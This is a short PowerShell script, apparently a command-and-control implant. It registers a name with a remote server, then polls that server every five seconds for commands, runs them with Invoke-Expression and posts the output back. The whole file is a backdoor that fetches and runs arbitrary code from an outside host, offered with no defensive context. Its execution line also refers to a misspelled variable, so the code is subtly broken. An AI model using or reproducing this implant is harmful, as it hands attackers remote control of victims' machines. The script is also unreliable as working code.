$server = "http://<SERVER_IP>:5000"
$name = "sc4rycat"

# 등록
Invoke-WebRequest -Uri "$server/reg" -Method POST -Body @{name=$name}


while ($true){
    $cmd = Invoke-WebRequest -Uri "$server/tasks/$name" -UseBasicParsing
    if ($cmd.Content -ne ""){
        $output = Invoke-Expression $cm.Content | Out-String
        Invoke-WebRequest -Uri "$server/results/$name" -Method POST -Body $output
    }
    start-Sleep -second 5
}
